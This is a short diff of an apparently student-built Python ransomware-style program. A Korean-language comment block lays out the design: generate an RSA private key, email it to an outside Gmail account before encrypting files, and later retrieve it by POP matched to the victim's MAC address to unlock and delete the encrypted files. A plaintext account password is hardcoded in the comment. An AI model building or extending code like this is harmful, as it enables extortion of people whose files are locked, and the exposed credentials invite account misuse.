@@ -26,11 +26,26 @@ iv = os.urandom(16)
 
 
 '''
-11/25
-메일 전송/수신 완료
+1125 수정사항 : <메일 전송/수신 시퀀스 추가>
 
+(1)테스트 방법:
+gui 창이 뜨고 나서 secureantdd@gmail.com / antdd1234 로 로그인 한 후
+자신의 mac 주소로 가장 최근에 온 메일의 private key를 input에 입력하면 => 복호화 성공
 
+(2)메일 전송 : run() 시작 부분
+ - 라이브러리 : stmplib 
+ - rsa private 키를 생성한 후, gmail서버로 전송함
+ - 전송 성공시 암호화 진행
+ - 메일 : secureantdd@gmail.com / antdd1234
 
+(3)메일 수신 : checkpassword()
+ - 라이브러리 : poplib
+ - 키를 입력받음 =>  gmail 의 리스트를 받아옴 => 사용자의 맥 주소와 일치하는 제목의 메일찾음
+   메일 찾을 시 메일 내용(private key)와 입력받은 키를 비교 
+   => 키가 일치할 경우 : 복호화진행 후 final gui 출력
+   => 키가 일치하지 않을 경우 : 아무일 없었던 듯이 다시 진행됨
+ - 메일의 리스트를 받아올 때는 "오래된 순" 으로 받아와 비교하므로
+   메일 수가 많을 수록 오버헤드 커짐! => 주기적으로 삭제하기
 '''
 
 
@@ -400,7 +415,7 @@ class RealMain:
                     ##! 복호화 및 타겟파일 삭제
                     dec_targetlist = self.decListFiles(os.getcwd())
                     for dec_target in dec_targetlist:  # 현재 디렉토리 내부에 antdd를 파일리스트로 가져온다
-                        dec(PKCS1_OAEP.new(RSA.importKey(key)), dec_target, out_filename=None)
+                        dec(PKCS1_OAEP.new(RSA.importKey(key.strip())), dec_target, out_filename=None)
                         os.remove(dec_target)
                     ##! 여기까지
                     self.myGui.finalGui()
